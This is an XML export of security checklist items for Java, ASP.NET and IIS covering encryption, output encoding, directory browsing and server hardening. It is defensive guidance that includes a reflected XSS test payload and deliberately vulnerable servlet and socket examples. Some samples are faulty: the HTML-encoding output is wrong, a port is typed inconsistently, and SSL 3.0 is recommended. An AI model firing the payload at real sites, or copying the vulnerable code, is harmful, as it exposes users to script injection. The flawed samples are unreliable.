&lt;li&gt;&lt;a href="?#ruledisplay:3437DF81-6B8C-4A14-BB6E-34F6EE21C45F"&gt;Guideline: Use Type Safe SQL Parameters When Constructing SQL Queries&lt;/a&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>26ca24fa-2c72-4482-80e3-7de6e8eb013d</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Communication Links Are Encrypted</title>
    <topic>Security</topic>
    <technology>Java</technology>
    <category>Communication Security</category>
    <phase>Implementation</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Ensure that the communication channels are encrypted when interacting with other software across the network.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Encrypting the communication links allows the application to preserve confidentiality and integrity of the transmitted data.&lt;/p&gt;
&lt;h1&gt;How to Check&lt;/h1&gt;
&lt;p&gt;Use the following steps to ensure that your application's communication links are encrypted:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Identify the connections used for transmitting sensitive data. &lt;/strong&gt;
Identify the sensitive data that is sent over the network and enumerate&amp;nbsp;the respective connections that are used for such communication.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Verify that connections are secured. &lt;/strong&gt;Using a network sniffer, verify that your application utilizes either IPSec or TLS/SSL then check the following:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;IPSec&lt;/strong&gt;:&amp;nbsp;If your application uses IPSec, verify that&amp;nbsp;all packets from your sniffed traffic between the specified hosts contain an Authentication Header (AH) and Encapsulating Security Payload (ESP) fields after the IP headers.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;TLS/SSL&lt;/strong&gt;:&amp;nbsp;If your application uses TLS/SSL, verify that&amp;nbsp;your sniffed traffic between the specified hosts contains an SSL handshake. Keep in mind the following considerations when verifying your application's use of SSL:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Certificate Validity&lt;/strong&gt;: Verify that your application's SSL certificate has not reached its expiration date.
&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Certificate Version&lt;/strong&gt;: Verify that your application uses SSL version 3.0 certificate.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Domain Name&lt;/strong&gt;: Verify that the domain name for your application's administrative interface is the same as the domain name listed in the SSL certificate.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Chain of Trust&lt;/strong&gt;: Verify that your application's users can verify your application's SSL certificate based on the root certificates that are stored in their browsers. If your application uses self-signed SSL certificates, ensure that your
 organization's root certificate is securely imported into the users' browsers.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Server Configuration&lt;/strong&gt;: Verify that your application's environment has enabled HTTPS. Verify that transactions of sensitive nature are transmitted only over HTTPS connections. Check if your application's deployment descriptor (e.g. web.xml)
 has the &lt;strong&gt;transport-guarantee&lt;/strong&gt; element set to &lt;strong&gt;CONFIDENTIAL&lt;/strong&gt;:&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&amp;lt;security-constraint&amp;gt;&lt;br&gt;  &amp;lt;web-resource-collection&amp;gt;&lt;br&gt;    &amp;lt;web-resource-name&amp;gt;AcctManager&amp;lt;/web-resource-name&amp;gt;&lt;br&gt;    &amp;lt;url-pattern&amp;gt;/acctmanager/*&amp;lt;/url-pattern&amp;gt;&lt;br&gt;    &amp;lt;http-method&amp;gt;GET&amp;lt;/http-method&amp;gt;&lt;br&gt;    &amp;lt;http-method&amp;gt;POST&amp;lt;/http-method&amp;gt;&lt;br&gt;  &amp;lt;/web-resource-collection&amp;gt;&lt;br&gt;  &amp;lt;user-data-constraint&amp;gt;&lt;br&gt;    &amp;lt;transport-guarantee&amp;gt;&lt;strong&gt;CONFIDENTIAL&lt;/strong&gt;&amp;lt;/transport-guarantee&amp;gt;&lt;br&gt;  &amp;lt;/user-data-constraint&amp;gt;&lt;br&gt;  &amp;lt;auth-constraint&amp;gt;&lt;br&gt;    &amp;lt;role-name&amp;gt;manager&amp;lt;/role-name&amp;gt;&lt;br&gt;  &amp;lt;/auth-constraint&amp;gt;&lt;br&gt;&amp;lt;/security-constraint&amp;gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;The following code establishes a connection between&amp;nbsp;two servers. Unfortunately, the communication is not encrypted; therefore, it is possible for an attacker to eavesdrop on the connection.&lt;/p&gt;
&lt;br&gt;
&lt;blockquote&gt;
&lt;pre&gt;String remoteHost = &amp;quot;server02.example.com&amp;quot;;&lt;br&gt;int remotePort = &amp;quot;1337&amp;quot;;&lt;br&gt;Socket sock = new Socket(remoteHost, remotePort);&lt;br&gt;InputStreamReader isr = new InputStreamReader(sock.getInputStream());&lt;br&gt;BufferedReader input = new BufferedReader(isr);&lt;br&gt;PrintWriter output = new PrintWriter(sock.getOutputStream(), true);&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Related Guideline&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:5E283FD0-1A55-4DC3-971D-BF7C3318E7CB"&gt;Guideline: Encrypt Communication Links (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>275e5831-738a-44de-997b-f79d97039027</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>All Output Data is Encoded</title>
    <topic>Security</topic>
    <technology>Java</technology>
    <category>Input and Data Validation</category>
    <phase>Implementation</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>1</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Ensure that all echoed input is first encoded.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Encoding echoed input prevents injection attacks such as cross-site scripting.&lt;/p&gt;
&lt;h1&gt;How to Check&lt;/h1&gt;
&lt;p&gt;An application can take input via various&amp;nbsp;sources, such as a web interface, database, file system or other software running on the server, and then use that same input in various outputs. Use the following steps to establish a validation strategy:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Identify all sources of input. &lt;/strong&gt;At design time identify all potential sources of input to your application. Once implemented, scour source code to discover sources of input that may have been missed in the design. Potential sources of input
 in a web application typically include:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;URL based parameters &lt;/li&gt;&lt;li&gt;Form based parameters &lt;/li&gt;&lt;li&gt;Hidden fields &lt;/li&gt;&lt;li&gt;Cookies &lt;/li&gt;&lt;li&gt;HTTP headers (Host, accept types, www authentication, cache settings, encodings, etc)
&lt;/li&gt;&lt;li&gt;Local filesystem &lt;/li&gt;&lt;li&gt;Database &lt;/li&gt;&lt;li&gt;Other services running on the system &lt;/li&gt;&lt;li&gt;Javascript variables &lt;/li&gt;&lt;li&gt;File upload and attributes (filename, size, data, etc) &lt;/li&gt;&lt;li&gt;DNS results or host names &lt;/li&gt;&lt;li&gt;External component call return values (COM, AJAX, ActiveX) &lt;/li&gt;&lt;/ul&gt;
&lt;p&gt;Once you&amp;nbsp;have listed the sources of input your application&amp;nbsp;can use, look for all entry points. Good starting points are method parameters and assignment statements. For example:
&lt;/p&gt;
&lt;p&gt;This method uses the &lt;strong&gt;searchTerm&lt;/strong&gt; variable.&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;void aggregateData(PrintWriter out, String searchTerm)&lt;br&gt; ...&lt;br&gt;&lt;br&gt;double[] rData = common.queryDBForIndex(searchTerm);&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;This assignment stores data from a &lt;strong&gt;GET&lt;/strong&gt; request parameter named
&lt;strong&gt;index&lt;/strong&gt; and stores it in the &lt;strong&gt;String searchTerm&lt;/strong&gt;. Ensure that this input is validated.&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;String searchTerm = request.getParameter(&amp;quot;index&amp;quot;);&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;This assignment uses the input that was gathered above to store more input from a database. Verify that
&lt;strong&gt;searchTerm&lt;/strong&gt; is validated before this use, and also ensure that &lt;strong&gt;
rData&lt;/strong&gt; is validated as another source of input.&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;double[] rData = common.queryDBForIndex(searchTerm);&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Trace data from source to sink. &lt;/strong&gt;Trace each source of input from the immediate source, through your application, to its final destination. The final sink may be in memory, on the hard drive, sent over the network or stored in a data store
 such as a database. Create a list of the input sources that are echoed back to the user through output - whether directly, through a file, in a URL or through a database or other intermediary source.&lt;/p&gt;
&lt;p&gt;Input used as output may be identified by the following:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;out.println() &lt;/li&gt;&lt;li&gt;append() &lt;/li&gt;&lt;li&gt;insert() &lt;/li&gt;&lt;li&gt;write() &lt;/li&gt;&lt;li&gt;Assignment operator (=) &lt;/li&gt;&lt;li&gt;Increment and assignment operator (&amp;#43;=) &lt;/li&gt;&lt;li&gt;Database write operations&lt;/li&gt;&lt;/ul&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Ensure input is properly encoded before being used as output. &lt;/strong&gt;
Each of the input sources identified above should have the input encoded properly before it is used as output. Encoding must be selected appropriately based upon how the output is returned to the client - either as HTML content or in a URL. Verify the context
 in which the output is used and ensure it is properly encoded:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;URLs - &lt;strong&gt;URLEncoder.encode(output)&lt;/strong&gt; &lt;/li&gt;&lt;li&gt;HTML - JSP HTML encoding: &lt;strong&gt;&amp;lt;%= {output} %&amp;gt;&lt;/strong&gt;&lt;/li&gt;&lt;/ul&gt;
&lt;strong&gt;Note: &lt;/strong&gt;A custom HTML encoder can be developed as shown below but using built-in functionality whenever possible is recommended.
&lt;ul&gt;
&lt;/ul&gt;
&lt;p&gt;Be aware that data taken from the URL and used within the HTML must be HTML encoded, not URL encoded. Consider a dynamically created form, which builds the
&lt;strong&gt;ACTION&lt;/strong&gt; tag from the current URL used to access the form. The user-supplied URL is used as input in this case, and the output is directly to the HTML page created. The URL must be HTML encoded prior to being used to avoid script injection issues.
 See the example below:&lt;/p&gt;
&lt;p&gt;User URL provided: &lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;http://server/form?x=&lt;strong&gt;&amp;quot;&amp;gt;&amp;lt;SCRIPT&amp;gt;alert('XSS');&amp;lt;/SCRIPT&amp;gt;&lt;/strong&gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;No encoding:&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&amp;lt;form action=&amp;quot;http://server/form?x=&lt;strong&gt;&amp;quot;&amp;gt;&amp;lt;SCRIPT&amp;gt;alert('XSS');&amp;lt;/SCRIPT&amp;gt;&lt;/strong&gt;&amp;quot;&amp;gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;URL Encoding:&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&amp;lt;form action=&amp;quot;http://server/form%3Fx%3D&lt;strong&gt;%22%3E%3CSCRIPT%3Ealert%28%27XSS%27%29%3B%3C/SCRIPT%3E&lt;/strong&gt;&amp;quot;&amp;gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;p&gt;HTML Encoding:&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt; &amp;lt;form action=&amp;quot;http://server/form?x=&lt;strong&gt;&amp;amp;quot;&amp;lt;&amp;lt;SCRIPT&amp;lt;alert('XSS');&amp;lt;/SCRIPT&amp;lt;&lt;/strong&gt;&amp;quot;&amp;gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;The following code produces a data analysis based on a financial index. Because it does not HTML encode the echoed input, the application is vulnerable to reflective cross-site scripting.&lt;/p&gt;
&lt;br&gt;
&lt;blockquote&gt;
&lt;pre&gt;import java.io.*;&lt;br&gt;import java.util.*;&lt;br&gt;import java.lang.*;&lt;br&gt;import javax.servlet.*;&lt;br&gt;import javax.servlet.http.*;&lt;br&gt;import java.util.regex.*;&lt;br&gt; public final class DataAggregator extends HttpServlet&lt;br&gt;{&lt;br&gt;      public void doGet(HttpServletRequest request, HttpServletResponse response)&lt;br&gt;            throws ServletException, IOException&lt;br&gt;      {&lt;br&gt;            PrintWriter out = response.getWriter();&lt;br&gt;            String searchTerm = request.getParameter(&amp;quot;index&amp;quot;);&lt;br&gt;             try&lt;br&gt;            {&lt;br&gt;                  if (validateSearchTerm(searchTerm))&lt;br&gt;                  {&lt;br&gt;                        String retString;&lt;br&gt;                        retString = &amp;quot;The queried index \&amp;quot;&amp;quot;;&lt;br&gt;                        // The application does not HTML encode the returned input&lt;br&gt;                        retString &amp;#43;= searchTerm;&lt;br&gt;                        retString &amp;#43;= &amp;quot;\&amp;quot; produced the following results:&amp;lt;br&amp;gt; &amp;quot;;&lt;br&gt;                        out.println(retString);&lt;br&gt;                        common.aggregateData(out, searchTerm);&lt;br&gt;                  }&lt;br&gt;                  else&lt;br&gt;                  {&lt;br&gt;                        // Add the appropriate logging and exception handling&lt;br&gt;                        // mechanisms. Consult the Exception Handling and&lt;br&gt;                        // Logging sections&lt;br&gt;                        out.println(&amp;quot;We cannot handle your request at the moment.&amp;quot;&lt;br&gt;                                 &amp;#43;  &amp;quot;Please try again later.&amp;quot;);&lt;br&gt;                  }&lt;br&gt;            }&lt;br&gt;             catch (Exception e)&lt;br&gt;            {&lt;br&gt;                  // Add the appropriate logging and exception handling&lt;br&gt;                  // mechanisms. Consult the Exception Handling&lt;br&gt;                  // and Logging sections&lt;br&gt;                  out.println(&amp;quot;We cannot handle your request at the moment.&amp;quot;&lt;br&gt;                           &amp;#43;  &amp;quot;Please try again later.&amp;quot;);&lt;br&gt;            }&lt;br&gt;             out.flush();&lt;br&gt;&lt;br&gt;             out.close();&lt;br&gt;      }&lt;br&gt;}&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;To learn more about cross-site scripting, including a library to help defend against cross-site scripting attacks, see:
&lt;a href="http://www-128.ibm.com/developerworks/tivoli/library/s-csscript/"&gt;Cross-site scripting&lt;/a&gt;.
&lt;/li&gt;&lt;li&gt;To learn more about cross-site scripting, see: &lt;a href="http://today.java.net/pub/a/today/2005/09/20/handling-web-app-input.html"&gt;
Handling Java Web Application Input, Part 2&lt;/a&gt;. &lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;Related Guideline&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:2D8158D1-E2D1-459F-9BD7-56D4B979EFE3"&gt;Guideline: Encode All Output Data (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>27c7810d-4c98-4252-827a-a8599032a41b</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>The Everyone group is restricted (no access to \WINNT\system32 or Web directories).</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Server Hardening</category>
    <phase>Deployment</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Web Application&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check to ensure that full control access&amp;nbsp;is not given to&amp;nbsp;the Everyone group for \WINNT\system32 or Web directories.&lt;/p&gt;
&lt;br&gt;
&lt;h1&gt;How to Fix&lt;/h1&gt;
&lt;p&gt;The default NTFS permissions for Windows&amp;nbsp;2000 grant members of the &lt;strong&gt;Everyone&lt;/strong&gt; group full control access to a number of key locations, including the root directory, \inetpub, and \inetpub\scripts.&lt;/p&gt;
&lt;p&gt;First grant FULL CONTROL to the Administrator account to the root (\), then remove access rights for the
&lt;strong&gt;Everyone&lt;/strong&gt; group from the following directories. &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Root (\) &lt;/li&gt;&lt;li&gt;System directory (\WINNT\system32) &lt;/li&gt;&lt;li&gt;Framework tools directory (\WINNT\Microsoft.NET\Framework\{version}) &lt;/li&gt;&lt;li&gt;Web site root directory and all content directories (the default is \inetpub\*)
&lt;/li&gt;&lt;/ul&gt;
&lt;blockquote&gt;&lt;strong&gt;Note&lt;/strong&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;This is not an issue in Windows Server 2003.&lt;/blockquote&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>2baffcad-75d4-44c7-8bdb-efcfa424ef8b</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Directory Browsing is Disabled</title>
    <topic>Security</topic>
    <technology>Java</technology>
    <category>Deployment Considerations</category>
    <phase>Deployment</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Ensure that your application has directory browsing disabled.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Directory browsing allows an attacker to browse your application's directory structure in search of unprotected files and components.&lt;/p&gt;
&lt;h1&gt;How to Check&lt;/h1&gt;
&lt;p&gt;Use the following steps to ensure that your application has directory browsing disabled:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Identify if directory browsing is enabled. &lt;/strong&gt;Navigate to your application's directories. Identify if your application's server returns the directory contents and not an HTTP error message.&lt;/p&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Locate the default servlet's configuration. &lt;/strong&gt;Open your application's deployment descriptor (e.g. web.xml) and locate the default servlet's configuration. If the default servlet is present, ensure it is mapped to the root directory of your
 application. Example: &lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&amp;lt;servlet&amp;gt;&lt;br&gt;      &amp;lt;servlet-name&amp;gt;default_servlet&amp;lt;/servlet-name&amp;gt;&lt;br&gt;      &amp;lt;servlet-class&amp;gt;&lt;br&gt;            org.apache.catalina.servlets.DefaultServlet&lt;br&gt;      &amp;lt;/servlet-class&amp;gt;&amp;lt;/servlet&amp;gt;&amp;lt;servlet-mapping&amp;gt;&lt;br&gt;      &amp;lt;servlet-name&amp;gt;default_servlet&amp;lt;/servlet-name&amp;gt;&lt;br&gt;      &amp;lt;url-pattern&amp;gt;/&amp;lt;/url-pattern&amp;gt;&lt;br&gt;&amp;lt;/servlet-mapping&amp;gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;/li&gt;&lt;li&gt;
&lt;p&gt;&lt;strong&gt;Ensure directory browsing is disabled in the default servlet's configuration.
&lt;/strong&gt;Verify that the default servlet is initialized&amp;nbsp;to disable the directory browsing by setting&amp;nbsp;the parameter
&lt;strong&gt;listings&lt;/strong&gt; to &lt;strong&gt;false&lt;/strong&gt;.&lt;/p&gt;
&lt;blockquote&gt;
&lt;pre&gt;&amp;lt;servlet&amp;gt;&lt;br&gt;      &amp;lt;servlet-name&amp;gt;default_servlet&amp;lt;/servlet-name&amp;gt;&lt;br&gt;      &amp;lt;servlet-class&amp;gt;&lt;br&gt;            org.apache.catalina.servlets.DefaultServlet&lt;br&gt;      &amp;lt;/servlet-class&amp;gt;&lt;br&gt;      &lt;strong&gt;&amp;lt;init-param&amp;gt;&lt;br&gt;            &amp;lt;param-name&amp;gt;listings&amp;lt;/param-name&amp;gt;&lt;br&gt;            &amp;lt;param-value&amp;gt;false&amp;lt;/param-value&amp;gt;&lt;br&gt;      &amp;lt;/init-param&amp;gt;&lt;br&gt;&lt;/strong&gt;&amp;lt;/servlet&amp;gt;&lt;/pre&gt;
&lt;/blockquote&gt;
&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;An application is deployed on a production server. Unfortunately, the developers did not disable directory browsing. This allows an attacker to search for unprotected configuration files.&lt;/p&gt;
&lt;h1&gt;Related Guideline&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:EAD019CA-025A-4DC6-A4DC-6DFDC9FBA131"&gt;Guideline: Disable Directory Browsing (Java Web Application)&lt;/a&gt;
&lt;/li&gt;&lt;/ul&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>2e38872b-aef4-4c72-9529-626f8ea9778c</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Web site root directory has deny write ACE for anonymous Internet accounts.</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Server Hardening</category>
    <phase>Deployment</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Web Application&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check to ensure that Web site root directory has deny write ACE for anonymous Internet accounts.&lt;/p&gt;
&lt;h1&gt;How to Check&lt;/h1&gt;
&lt;p&gt;IISLockdown denies write access to content directories for the anonymous account by applying a deny write access control entry (ACE) for the Web Anonymous Users and Web Applications groups. It also adds a deny execute ACL on command-line tools.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance.&lt;/p&gt;
</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>2ea277fd-8603-4906-a987-4ca5b8465436</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Directory Browsing is Disabled</title>
    <topic>Security</topic>
    <technology>ASP.NET 3.5</technology>
    <category>Deployment Considerations</category>
    <phase>Deployment</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>2</priority>
    <status />
    <author />
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Ensure that directory browsing for your application's IIS directory is disabled.&lt;/p&gt;
&lt;h1&gt;Why&lt;/h1&gt;
&lt;p&gt;Directory browsing allows an attacker to browse your application's directory structure in search of unprotected files and components.&lt;/p&gt;
&lt;h1&gt;How to Check&lt;/h1&gt;
&lt;p&gt;Take the following steps to determine if directory browsing is disabled:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Open the IIS management utility. &lt;/li&gt;&lt;li&gt;Navigate to your application's directory. &lt;/li&gt;&lt;li&gt;Right click and select &lt;strong&gt;Properties&lt;/strong&gt;. &lt;/li&gt;&lt;li&gt;Navigate to the &lt;strong&gt;Directory&lt;/strong&gt; tab. &lt;/li&gt;&lt;li&gt;Verify that the &lt;strong&gt;Directory Browsing&lt;/strong&gt; checkbox is &lt;strong&gt;not checked&lt;/strong&gt;.
&lt;/li&gt;&lt;li&gt;Click &lt;strong&gt;OK&lt;/strong&gt;.&lt;/li&gt;&lt;/ol&gt;
&lt;h1&gt;Problem Example&lt;/h1&gt;
&lt;p&gt;An application is deployed on a production server. Unfortunately, the developers did not disable directory browsing. Directory browsing reveals critical clues which can be used to determine what software is being used on the server and how it is configured.
 It enables attackers to search for and download unprotected configuration files, source code, libraries, or data files. After finding and decompiling a library the attacker was able to discover another weakness and compromise the server further.
&lt;/p&gt;
&lt;h1&gt;Additional Resources&lt;/h1&gt;
&lt;li&gt;To learn more about setting web site permissions, including directory browsing, see
&lt;a href="http://technet2.microsoft.com/windowsserver/en/library/ede1f294-1dfd-4af8-8a38-d03f252c13431033.mspx?mfr=true"&gt;
Configure Web Site Permissions in IIS6&lt;/a&gt;
&lt;h1&gt;Related Guideline&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="?#ruledisplay:EB8D8FDB-1AEB-4923-A8F3-8FF7D90B6B5A"&gt;Guideline: Disable Directory Browsing&amp;nbsp;&lt;/a&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;Adapted from Microsoft patterns &amp;amp; practices guidance. &lt;/p&gt;
&lt;/li&gt;</htmlContent>
  </GuidanceItem_V3>
  <GuidanceItem_V3>
    <guidanceItemId>2f0e253a-77be-4c14-b163-b2bb5a33930d</guidanceItemId>
    <guidanceItemId_Original>00000000-0000-0000-0000-000000000000</guidanceItemId_Original>
    <source_guidanceItemId>00000000-0000-0000-0000-000000000000</source_guidanceItemId>
    <libraryId>4738d445-bc9b-456c-8b35-a35057596c16</libraryId>
    <guidanceType>00000000-0000-0000-0000-000000000000</guidanceType>
    <creatorId>00000000-0000-0000-0000-000000000000</creatorId>
    <title>Extensions not used by the application are mapped to 404.dll (.idq, .htw, .ida, .shtml, .shtm, .stm, idc, .htr, .printer).</title>
    <topic>Security</topic>
    <technology> Any</technology>
    <category>Server Hardening</category>
    <phase>Deployment</phase>
    <rule_Type>Checklist Item</rule_Type>
    <priority>2</priority>
    <status />
    <author>J.D. Meier, Alex Mackman, Michael Dunner, Srinath Vasireddy, Ray Escamilla and Anandha Murukan</author>
    <delete>false</delete>
    <htmlContent>
&lt;h1&gt;Applies to&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;div&gt;Web Application&lt;/div&gt;
&lt;/li&gt;&lt;/ul&gt;
&lt;h1&gt;What to Check For&lt;/h1&gt;
&lt;p&gt;Check to ensure that the extensions that are&amp;nbsp;not used by the application are mapped to 404.dll.&lt;/p&gt;
&lt;br&gt;
&lt;h1&gt;How to Fix&lt;/h1&gt;
&lt;p&gt;On Windows&amp;nbsp;2000 and Windows Server 2003, the IIS file extensions of interest include: .asp, .asa, .cer, .cdx, .htr, .idc, .shtm, .shtml, .stm, and .printer.&lt;/p&gt;
&lt;p&gt;If you do not use any one of these extensions, map the extension to the 404.dll, which is provided by IISLockdown. For example, if you do not want to serve ASP pages to clients, map .asp to the 404.dll.&lt;/p&gt;
&lt;p&gt;The mappings altered by IISLockdown depend on the server template that you choose:
&lt;/p&gt;
&lt;ul&gt;
